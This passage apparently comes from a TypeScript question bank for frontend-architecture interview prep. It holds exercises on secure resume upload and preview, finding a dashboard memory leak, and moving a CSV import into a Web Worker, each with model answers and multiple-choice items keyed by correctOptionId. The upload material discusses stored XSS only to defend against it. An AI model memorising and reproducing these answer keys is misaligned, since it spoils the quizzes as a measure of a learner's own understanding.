      'Store outside the web root / on a separate storage host; no public URLs — OWASP: store on a different server or outside the webroot.',
      'Direct-to-storage upload with a short-lived presigned URL scoped to one object, size and content type; server confirms afterwards.',
      'Scan for malware and verify file signatures (magic bytes) asynchronously; mark status pending → clean/rejected.',
      'Preview from a separate, cookieless domain via short-lived signed URLs after an authorization check; render in a sandboxed iframe or convert to PDF/images server-side.',
      'Serve with nosniff and an explicit content type (attachment for downloads — general HTTP practice).',
      'UX: progress, cancel (AbortController / xhr.abort), retry/resume, drag-and-drop with keyboard alternative, clear errors.',
    ],
    modelAnswer: `**What is wrong today.** Files are public at guessable URLs (\`/public/uploads/jane_cv.pdf\`). Original filenames are trusted, which invites path traversal, collisions and HTML-named files. And previews render from **the app's own origin**. An uploaded HTML or SVG file renamed \`.pdf\` that the browser sniffs as HTML would run script with recruiter cookies. That is stored XSS through a file.

**Upload flow.**
1. **Client checks for UX only**: extension allowlist (\`.pdf\`, \`.docx\`), size ≤ 10 MB, and a friendly error before upload. These checks are trivial to bypass, so the server repeats all of them.
2. Client asks the API for an upload slot: \`POST /applications/:id/resume-upload\` → \`{ fileId, uploadUrl }\`. The server authorises the candidate and returns a **short-lived presigned URL** scoped to one object key, maximum size and content type. The key is generated (\`resumes/<org>/<fileId>\`), never the user's filename. OWASP: "Change the filename to something generated by the application."
3. The browser uploads **directly to object storage** with progress events. Cancel uses \`AbortController\` (fetch) or \`xhr.abort()\`. Large files on slow networks use multipart/resumable upload, so a dropped connection resumes instead of restarting.
4. Client calls \`POST /files/:fileId/complete\`. The server checks the object exists, its **size**, and its **magic bytes** (a real PDF starts with \`%PDF\`). OWASP warns not to trust the \`Content-Type\` header. The server queues a **malware scan** and sets status to \`pending_scan\`.
5. The UI shows "Uploaded, checking file…", then "Ready" or "Rejected" from status polling or a push event.

**Preview flow.**
1. The recruiter opens the profile. The API checks they belong to the hiring organisation and that the file is \`clean\`, then returns a **signed URL valid for a few minutes** on a **separate storage domain** with no app cookies (for example \`files.ats-usercontent.example\`). OWASP recommends storing files on a different server or outside the webroot. A separate origin also means anything that does execute cannot reach the app's session.
2. Responses carry an explicit \`Content-Type: application/pdf\` and \`X-Content-Type-Options: nosniff\`, and \`Content-Disposition: attachment\` for the download button. These are standard HTTP hardening rather than items from the OWASP page.
3. Render PDFs in \`<iframe sandbox src={signedUrl}>\` (grant only what the viewer needs). For DOCX, **convert server-side** to PDF or images. Never render uploaded HTML.
4. For the most control, render with a PDF.js-style viewer in a **Web Worker**. Parsing stays off the main thread and you control which features (links, forms, scripts) are active.

**Failure handling.** Retries with backoff on network errors. Clear messages for "too large", "wrong type" and "scan failed". The application can be submitted only once the upload is complete, and draft state is kept so a failed upload does not lose the form.

**Accessibility.** The drop zone has a real \`<input type="file">\` and button, progress goes to a polite live region, and errors are linked to the field.`,
    pitfalls: [
      'Trusting client-side validation or the Content-Type header.',
      'Storing files under user-supplied names in a public web root.',
      'Previewing uploads from the main app origin.',
      'Long-lived or unauthenticated file URLs for PII.',
      'Blocking the main thread parsing large PDFs.',
    ],
    versionNotes:
      'Checked against the OWASP File Upload Cheat Sheet (allowlist extensions, do not trust Content-Type, generated filenames, separate server / outside webroot, size limit) and MDN <iframe> sandbox on 2026-11-26. Content-Disposition and nosniff are general HTTP practice, not from the OWASP page.',
    docSourceIds: ['owasp-file-upload', 'mdn-iframe', 'mdn-abortcontroller'],
    mcqs: [
      {
        id: 'm1',
        question: 'Why should uploaded files be served from a separate domain rather than the app origin?',
        options: [
          { id: 'a', text: 'It is faster', explanation: 'Performance is not the main reason.' },
          { id: 'b', text: 'If a file is ever interpreted as HTML/script, it runs in an origin without the app\'s cookies or DOM', explanation: 'Correct — it contains the blast radius.' },
          { id: 'c', text: 'Browsers refuse to display PDFs from the same origin', explanation: 'They do not.' },
          { id: 'd', text: 'It removes the need for authorization', explanation: 'Access still needs authorization (signed URLs).' },
        ],
        correctOptionId: 'b',
        explanation: 'Isolating user content on a different origin means content-sniffing or viewer bugs cannot reach the authenticated app.',
        sourceIds: ['owasp-file-upload'],
      },
      {
        id: 'm2',
        question: 'A file is named `resume.pdf` and uploaded with `Content-Type: application/pdf`. What should the server trust?',
        options: [
          { id: 'a', text: 'Both, because they agree', explanation: 'Both are attacker-controlled.' },
          { id: 'b', text: 'Neither on its own — verify the file signature and content, and generate a new name', explanation: 'Correct.' },
          { id: 'c', text: 'Only the extension', explanation: 'Extensions are trivially changed.' },
          { id: 'd', text: 'Only the Content-Type header', explanation: 'OWASP: the Content-Type header can be spoofed.' },
        ],
        correctOptionId: 'b',
        explanation: 'Filenames and headers come from the client. Validate content server-side and replace the filename.',
        sourceIds: ['owasp-file-upload'],
      },
      {
        id: 'm3',
        question: 'How do you let a candidate cancel an in-progress fetch() upload?',
        options: [
          { id: 'a', text: 'Call fetch.cancel()', explanation: 'No such method.' },
          { id: 'b', text: 'Pass an AbortController signal to fetch and call controller.abort()', explanation: 'Correct.' },
          { id: 'c', text: 'Reload the page', explanation: 'Loses the form state.' },
          { id: 'd', text: 'Set the file input value to an empty string', explanation: 'That does not stop the request.' },
        ],
        correctOptionId: 'b',
        explanation: 'AbortController.abort() rejects the fetch with an AbortError and stops the request.',
        sourceIds: ['mdn-abortcontroller'],
      },
    ],
    followUps: [
      { id: 'f1', level: 'mechanism', question: 'How does a presigned upload URL work, and what should it be scoped to?', expectedConcepts: ['server signs a time-limited request', 'one object key', 'max size and content type', 'short expiry'], sourceIds: ['owasp-file-upload'] },
      { id: 'f2', level: 'application', question: 'Implement upload progress in the browser. Why might you still use XMLHttpRequest?', expectedConcepts: ['xhr.upload.onprogress', 'fetch lacks simple upload progress', 'abort support'], sourceIds: ['mdn-abortcontroller'] },
      { id: 'f3', level: 'edge-cases', question: 'The upload succeeds but the malware scan takes two minutes. What does the UI show?', expectedConcepts: ['pending status', 'allow submission with pending file or block', 'push or poll for status', 'clear rejected state'], sourceIds: ['owasp-file-upload'] },
      { id: 'f4', level: 'production', question: 'How would you render a 200-page PDF preview without freezing the dashboard?', expectedConcepts: ['parse in a Web Worker', 'render visible pages only', 'virtualize pages', 'server-side thumbnails'], sourceIds: ['mdn-transferable'] },
    ],
  },

  // ---------------------------------------------------------------------------------------------
  // 5. Memory leak hunt
  // ---------------------------------------------------------------------------------------------
  {
    schemaVersion: 1,
    kind: 'design',
    execution: 'quiz',
    track: 'architecture',
    id: 'arch-memory-leak-hunt',
    slug: 'memory-leak-hunt',
    title: 'Find and fix a memory leak in a long-lived dashboard',
    difficulty: 'hard',
    priority: 'P1',
    seniority: ['Senior', 'SDE-3', 'MTS'],
    topics: ['memory profiling', 'heap snapshots', 'detached DOM', 'garbage collection', 'closures', 'WeakMap'],
    estimatedMinutes: 25,
    conceptIds: ['memory-leaks', 'closures', 'react-effects', 'memoization'],
    research: {
      provenance: 'DOCUMENTED_TECHNICAL_EXERCISE',
      frequencyConfidence: 'LOW_CONFIDENCE',
      verificationStatus: 'SOURCES_VERIFIED',
      lastVerified: VERIFIED,
      evidence: [
        { sourceId: 'chrome-memory-problems', url: 'https://developer.chrome.com/docs/devtools/memory-problems', originalTitle: 'Fix memory problems', note: 'Task Manager, Performance panel memory, heap snapshots, Allocations on timeline, detached elements.' },
        { sourceId: 'react-useeffect', url: 'https://react.dev/reference/react/useEffect', originalTitle: 'useEffect', note: 'Cleanup functions; StrictMode extra setup/cleanup cycle in development.' },
        { sourceId: 'mdn-map', url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map', originalTitle: 'Map' },
      ],
      researchNotes: `${NO_FREQUENCY_EVIDENCE} "Memory and CPU profiling" is listed in the learner's target job description, per the learner's prep plan; it is context, not evidence.`,
    },
    scenario: `Recruiters keep the ATS dashboard open all day. Support tickets say the tab "gets slow after lunch" and sometimes crashes with "Aw, Snap! Out of memory". The dashboard has a candidate table, a slide-over drawer opened per candidate (with a chart library and a WebSocket subscription for live notes), and a memoized \`getCandidate(id)\` helper.

Walk me through how you would confirm the leak, find what is retaining memory, and fix it. Then explain how JavaScript garbage collection decides what to free.`,
    constraints: [
      'Chrome is the main browser; you can reproduce locally with production data volumes.',
      'You cannot ask users to install anything.',
    ],
    answerOutline: [
      'GC is reachability-based: objects reachable from roots (globals, stack, closures, DOM, pending callbacks) stay alive; the rest is collected (mark-and-sweep, generational in V8).',
      'Confirm: Chrome Task Manager memory column over time; Performance panel with Memory enabled while repeating "open drawer → close" 20×; baseline should return after GC.',
      'Locate: heap snapshot before, repeat the action, force GC, snapshot after; Comparison view; filter "Detached" for detached DOM trees.',
      'Follow the retainers path to the root — e.g. window listener closure → drawer ref → detached DOM.',
      'Allocations on timeline / allocation sampling to see which functions allocate memory that survives.',
      'Likely culprits: missing effect cleanup (listeners, intervals, WebSocket), chart instance not destroyed, unbounded memoize Map, closures capturing large data.',
      'Fixes: cleanup in every effect (AbortController signal for listeners), destroy chart on unmount, bound the cache (LRU/TTL) or WeakMap, avoid retaining large objects in long-lived closures.',
      'Prevent regressions: StrictMode in dev, an automated mount/unmount memory check, code-review checklist.',
    ],
    modelAnswer: `**How GC decides.** Browsers free memory by **reachability**. Starting from roots (globals, the current call stack, live closures, the DOM tree, timers, listeners and other pending callbacks), the engine marks everything it can reach and frees the rest. V8 does this generationally, so short-lived objects are cheap to collect. A "leak" in JavaScript is therefore memory that is **still reachable** although the app no longer needs it. Something forgot to let go.

**1. Confirm it is a leak.** Watch the tab in **Chrome Task Manager** (memory footprint and JavaScript memory columns) during normal use. Then record the **Performance** panel with Memory enabled while repeating one action: open a candidate drawer, close it, twenty times. A healthy app shows a sawtooth that returns to roughly the same baseline after GC. A leak shows the baseline climbing with each repetition.

**2. Find what is retained.**
1. Take a **heap snapshot** (Memory panel), do the open/close cycle ten times, click the garbage-collect button, and take a second snapshot.
2. Use the **Comparison** view: sort by *# Delta*. Ten new \`CandidateDrawer\` fibers, chart instances or large arrays means each open leaks one.
3. Filter by **"Detached"**. DevTools defines a detached node as one "removed from the DOM tree but some JavaScript still references it". Ten detached drawer trees confirms the drawer DOM is retained. The **Detached elements** profile shows this directly.
4. Select a leaked object and read its **retainers** path up to a root. Typical result: \`Window → resize listener → closure → drawerRef → HTMLDivElement (detached)\`.
5. For leaks that are not DOM, use **Allocations on timeline** to see which function allocated the memory that survives GC.

**3. Typical culprits here and fixes.**

~~~tsx
useEffect(() => {
  const controller = new AbortController();
  window.addEventListener('resize', onResize, { signal: controller.signal });
  const socket = notes.subscribe(candidateId, onNote);
  const chart = createChart(canvasRef.current!, data);
  return () => {
    controller.abort();   // removes every listener registered with this signal
    socket.unsubscribe(); // otherwise the socket keeps onNote's closure (and the drawer) alive
    chart.destroy();      // chart libraries hold canvases, data and their own listeners
  };
}, [candidateId]);
~~~

- **The memoized \`getCandidate\`**: an unbounded \`Map\` keyed by id grows with every candidate viewed all day. Bound it with LRU/TTL, or let a query cache with garbage collection of unused entries own the data.
- **Closures**: a long-lived callback (a WebSocket handler, a module-level cache) that captures a large object keeps it alive. Capture ids, not whole objects.
- **WeakMap** for metadata keyed by objects, so entries die with their keys.

**4. Verify and prevent.** Repeat the snapshot comparison and expect zero growth per cycle. Keep **StrictMode** on in development, because its extra setup/cleanup cycle exposes missing cleanups. Add a CI check that mounts and unmounts heavy views N times and compares heap size. Make "every subscription has a cleanup" a code-review checklist item.`,
    pitfalls: [
      'Taking a single snapshot instead of comparing before/after a repeated action.',
      'Forgetting to force GC before snapshots, so garbage looks like a leak.',
      'Assuming closures are inherently leaky rather than finding what keeps the closure reachable.',
      'Leaving DevTools console references to big objects while profiling.',
      'Fixing symptoms (reload the tab hourly) instead of the retainer.',
    ],
    versionNotes:
      'Checked against Chrome DevTools "Fix memory problems" (Task Manager, Performance memory, heap snapshots, Allocations on timeline, Detached elements; definition of detached nodes) and react.dev useEffect on 2026-11-26.',
    docSourceIds: ['chrome-memory-problems', 'react-useeffect', 'mdn-map'],
    mcqs: [
      {
        id: 'm1',
        question: 'What is a detached DOM node?',
        options: [
          { id: 'a', text: 'A node hidden with display: none', explanation: 'Hidden nodes are still in the DOM tree.' },
          { id: 'b', text: 'A node removed from the DOM tree that JavaScript still references', explanation: 'Correct — it cannot be garbage-collected.' },
          { id: 'c', text: 'A node inside a Shadow DOM', explanation: 'Shadow DOM nodes are attached to a host.' },
          { id: 'd', text: 'A node created with createElement that was never inserted', explanation: 'Only a leak if something keeps referencing it; the term refers to removed-but-referenced nodes.' },
        ],
        correctOptionId: 'b',
        explanation: 'Chrome DevTools: a node is detached when it is removed from the DOM tree but some JavaScript still references it.',
        sourceIds: ['chrome-memory-problems'],
      },
      {
        id: 'm2',
        question: 'Which technique best shows what leaks when a drawer opens and closes?',
        options: [
          { id: 'a', text: 'One heap snapshot after using the app for an hour', explanation: 'No baseline to compare against.' },
          { id: 'b', text: 'Snapshot, repeat open/close N times, force GC, snapshot again, compare', explanation: 'Correct — objects that grow by N are the leak.' },
          { id: 'c', text: 'console.log(performance.now()) in the drawer', explanation: 'Measures time, not memory.' },
          { id: 'd', text: 'Lighthouse performance score', explanation: 'Lighthouse does not track memory retention across interactions.' },
        ],
        correctOptionId: 'b',
        explanation: 'Comparing snapshots around a repeated action isolates what that action retains.',
        sourceIds: ['chrome-memory-problems'],
      },
      {
        id: 'm3',
        question: 'Why can a WeakMap not report its size or be iterated?',
        options: [
          { id: 'a', text: 'It is slower than Map', explanation: 'Speed is not the reason.' },
          { id: 'b', text: 'Its entries can disappear whenever a key is garbage-collected, so contents are not observable deterministically', explanation: 'Correct.' },
          { id: 'c', text: 'It only stores primitives', explanation: 'WeakMap keys must be objects (or non-registered symbols).' },
          { id: 'd', text: 'It is deprecated', explanation: 'It is a standard, supported structure.' },
        ],
        correctOptionId: 'b',
        explanation: 'WeakMap holds keys weakly. Exposing size or iteration would reveal GC timing, so the API omits them.',
        sourceIds: ['mdn-map'],
      },
    ],
    followUps: [
      { id: 'f1', level: 'definition', question: 'How does JavaScript garbage collection work?', expectedConcepts: ['reachability from roots', 'mark and sweep', 'generational collection', 'no manual free'], sourceIds: ['chrome-memory-problems'] },
      { id: 'f2', level: 'mechanism', question: 'Map vs WeakMap: give a real use case for each.', expectedConcepts: ['Map for iterable caches', 'WeakMap for per-object metadata', 'keys must be objects', 'not iterable'], sourceIds: ['mdn-map'] },
      { id: 'f3', level: 'application', question: 'How does a CPU profile differ from a memory profile, and when do you use each?', expectedConcepts: ['CPU: where time is spent, long tasks, flame chart', 'memory: what is retained', 'GC pauses visible in performance panel'], sourceIds: ['chrome-memory-problems'] },
      { id: 'f4', level: 'production', question: 'How would you catch memory regressions before users do?', expectedConcepts: ['automated mount/unmount test', 'heap size budget in CI', 'StrictMode', 'review checklist for effects'], sourceIds: ['react-useeffect'] },
    ],
  },

  // ---------------------------------------------------------------------------------------------
  // 6. Web Workers
  // ---------------------------------------------------------------------------------------------
  {
    schemaVersion: 1,
    kind: 'design',
    execution: 'quiz',
    track: 'architecture',
    id: 'arch-web-worker-offload',
    slug: 'web-worker-offload',
    title: 'Move a heavy CSV import off the main thread',
    difficulty: 'medium',
    priority: 'P1',
    seniority: ['Senior', 'SDE-3', 'MTS'],
    topics: ['Web Workers', 'postMessage', 'structured clone', 'transferable objects', 'WebAssembly', 'INP'],
    estimatedMinutes: 20,
    conceptIds: ['web-workers', 'event-loop', 'react-performance'],
    research: {
      provenance: 'DOCUMENTED_TECHNICAL_EXERCISE',
      frequencyConfidence: 'LOW_CONFIDENCE',
      verificationStatus: 'SOURCES_VERIFIED',
      lastVerified: VERIFIED,
      evidence: [
        { sourceId: 'mdn-transferable', url: 'https://developer.mozilla.org/docs/Web/API/Web_Workers_API/Transferable_objects', originalTitle: 'Transferable objects', note: 'Transferred ArrayBuffer is unusable afterwards (byteLength 0); transfer typed array .buffer.' },
        { sourceId: 'mdn-structuredclone', url: 'https://developer.mozilla.org/en-US/docs/Web/API/structuredClone', originalTitle: 'structuredClone()' },
        { sourceId: 'webdev-inp-metric', url: 'https://web.dev/articles/inp', originalTitle: 'Interaction to Next Paint (INP)' },
      ],
      researchNotes: `${NO_FREQUENCY_EVIDENCE} "Web Workers and WebAssembly" are listed in the learner's target job description, per the learner's prep plan; that is context, not evidence.`,
    },
    scenario: `Recruiters bulk-import candidates from a CSV (often 50,000 rows, 20 MB). The current code reads the file, parses it with a JS CSV library, validates every row (email format, duplicate detection, phone normalisation) and shows a preview table. The page freezes for 3–4 seconds; clicks and the Cancel button do nothing during that time.

Redesign it. When is a Web Worker the right tool, how does data get in and out efficiently, and where would \`useTransition\` or WebAssembly fit?`,
    constraints: [
      'Must work in current Chrome, Safari and Firefox.',
      'The user must be able to cancel an import at any time.',
      'The preview table shows the first 100 rows and a summary of errors.',
    ],
    answerOutline: [
      'The freeze is a long task on the main thread: parsing/validation blocks input handling and rendering (bad INP).',
      'Workers run JS on a background thread without DOM access; ideal for pure CPU work like parsing and validation.',
      'Data in: read the File as an ArrayBuffer and transfer it (postMessage with transfer list) — zero-copy; the original becomes unusable (byteLength 0). Or post the File itself.',
      'Data out: post compact results (first 100 rows, error summary, counts), not 50,000 objects; structured clone copies everything you post.',
      'Progress messages per chunk; Cancel = worker.terminate() or a cancel message; correlate requests with ids.',
      'useTransition/useDeferredValue only make React rendering interruptible; they do not speed up parsing. Use them for rendering the results, plus virtualization.',
      'WebAssembly in the worker when a native parser/validator is meaningfully faster or already exists; measure first.',
      'Alternatives: chunking with yields on the main thread, server-side import for very large files.',
    ],
    modelAnswer: `**Why it freezes.** Parsing and validating 50,000 rows is one multi-second **long task** on the main thread. While it runs, the browser cannot handle the Cancel click, paint, or run any other JavaScript. That shows up as terrible **Interaction to Next Paint**.

**When a worker is right.** The work is pure computation on data, needs no DOM, takes far longer than the cost of starting a worker and passing messages, and the UI must stay interactive. All of that is true here. A worker does not make the parse faster. It moves it off the thread that handles input.

**Design.**

~~~ts
// importer.ts (main thread)
const worker = new Worker(new URL('./import.worker.ts', import.meta.url), { type: 'module' });

export async function startImport(file: File, onProgress: (pct: number) => void) {
  const buffer = await file.arrayBuffer();
  const id = crypto.randomUUID();
  return new Promise<ImportSummary>((resolve, reject) => {
    worker.onmessage = ({ data }) => {
      if (data.id !== id) return;
      if (data.type === 'progress') onProgress(data.pct);
      if (data.type === 'done') resolve(data.summary);
      if (data.type === 'error') reject(new Error(data.message));
    };
    worker.postMessage({ id, buffer }, [buffer]); // transfer, not copy
  });
}
export const cancelImport = () => worker.terminate(); // recreate on next import
~~~

- **Getting data in.** Read the file as an \`ArrayBuffer\` and **transfer** it in the transfer list. Ownership moves to the worker with no copy, and MDN notes the original is no longer usable (its \`byteLength\` becomes 0). Typed arrays are not transferable themselves, so transfer their \`.buffer\`. Posting the \`File\` object is also fine, since the worker can read it itself.
- **Inside the worker.** Decode, parse in chunks of about 5,000 rows, validate, detect duplicates with a \`Set\`, and post a \`progress\` message after each chunk.
- **Getting data out.** Everything posted is copied with the structured clone algorithm, which itself costs main-thread time for huge graphs. So post a **compact summary**: total rows, error counts by type, the first 100 rows for preview, and an id the server can use to fetch the rest. Keep the full parsed set in the worker, or send it straight to the API from the worker.
- **Cancel.** \`worker.terminate()\` stops it immediately. Recreate the worker for the next import. Request ids ensure a late message from an old job is ignored.

**Where React features fit.** \`useTransition\` and \`useDeferredValue\` make **React rendering** interruptible. They cannot split a single synchronous parse. Use them, together with virtualization, when rendering the preview and error table, so typing in a filter box stays responsive.

**Where WebAssembly fits.** Run a WASM module **inside the worker** when a native implementation is meaningfully faster (a SIMD-optimised CSV parser) or already exists (a validated phone-number library). Measure against the JS version first, because boundary crossings and copying strings in and out of WASM memory have a cost.

**Alternatives.** For moderate sizes, process in chunks on the main thread and yield between chunks (\`setTimeout\` or \`scheduler.yield()\` where supported). For huge or sensitive imports, upload the file and process it **on the server**, which also gives you one validation implementation.`,
    pitfalls: [
      'Expecting useTransition to fix a long synchronous computation.',
      'Posting the full 50,000-row result back, so cloning costs seconds on the main thread.',
      'Reading a buffer after transferring it (byteLength is 0).',
      'No request ids, so a cancelled job\'s late message overwrites the new one.',
      'Creating a worker per row or per chunk.',
    ],
    versionNotes:
      'Checked against MDN Transferable objects (transferred buffer unusable, byteLength 0; typed arrays transfer via .buffer), MDN structuredClone and web.dev INP on 2026-11-26. scheduler.yield() support varies by browser.',
    docSourceIds: ['mdn-transferable', 'mdn-structuredclone', 'webdev-inp-metric', 'react-usetransition'],
    mcqs: [
      {
        id: 'm1',
        question: 'After `worker.postMessage({ buf }, [buf])`, what is `buf.byteLength` on the main thread?',
        options: [
          { id: 'a', text: 'Unchanged — postMessage always copies', explanation: 'Listing it in the transfer list moves ownership instead of copying.' },
          { id: 'b', text: '0 — the buffer was transferred and is no longer usable here', explanation: 'Correct.' },
          { id: 'c', text: 'It throws a TypeError', explanation: 'Reading byteLength works; it is 0.' },
          { id: 'd', text: 'Half the original size', explanation: 'Transfers are all-or-nothing.' },
        ],
        correctOptionId: 'b',
        explanation: 'A transferred ArrayBuffer is detached from the sending context; MDN shows byteLength becoming 0.',
        sourceIds: ['mdn-transferable'],
      },
      {
        id: 'm2',
        question: 'Which task is the worst fit for a Web Worker?',
        options: [
          { id: 'a', text: 'Parsing and validating a 20 MB CSV', explanation: 'Classic worker task.' },
          { id: 'b', text: 'Measuring an element\'s size to position a tooltip', explanation: 'Correct — workers have no DOM access.' },
          { id: 'c', text: 'Building a client-side search index', explanation: 'Pure computation — good fit.' },
          { id: 'd', text: 'Image resizing with OffscreenCanvas', explanation: 'OffscreenCanvas is transferable and usable in workers.' },
        ],
        correctOptionId: 'b',
        explanation: 'Workers cannot touch the DOM; layout reads must happen on the main thread.',
        sourceIds: ['mdn-transferable'],
      },
      {
        id: 'm3',
        question: 'A 2-second synchronous parse is wrapped in `startTransition`. What happens?',
        options: [
          { id: 'a', text: 'The parse runs in the background and the UI stays responsive', explanation: 'startTransition does not move or split your JavaScript.' },
          { id: 'b', text: 'The page still freezes for 2 seconds; only React rendering work is interruptible', explanation: 'Correct.' },
          { id: 'c', text: 'React moves the callback to a Web Worker', explanation: 'React never does that.' },
          { id: 'd', text: 'React throws because transitions must be async', explanation: 'Sync transitions are allowed.' },
        ],
        correctOptionId: 'b',
        explanation: 'Transitions mark state updates as non-urgent so React can interrupt rendering. The callback itself runs synchronously.',
        sourceIds: ['react-usetransition'],
      },
    ],
    followUps: [
      { id: 'f1', level: 'mechanism', question: 'What can and cannot be sent with postMessage?', expectedConcepts: ['structured clone: objects, Maps, Dates, typed arrays', 'no functions or DOM nodes', 'transferables move ownership'], sourceIds: ['mdn-structuredclone', 'mdn-transferable'] },
      { id: 'f2', level: 'application', question: 'Wrap a worker in a promise-based API that supports concurrent requests.', expectedConcepts: ['request ids', 'map of pending resolvers', 'error messages', 'Comlink-style RPC'], sourceIds: ['mdn-postmessage'] },
      { id: 'f3', level: 'edge-cases', question: 'When is SharedArrayBuffer needed, and what does it require?', expectedConcepts: ['shared memory between threads', 'Atomics', 'cross-origin isolation (COOP/COEP)'], sourceIds: ['mdn-transferable'] },
      { id: 'f4', level: 'architecture', question: 'When would you use WebAssembly in a frontend app, and when not?', expectedConcepts: ['CPU-heavy existing native code', 'run inside worker', 'boundary and copy costs', 'measure vs JS'], sourceIds: ['mdn-transferable'] },
    ],
  },
];
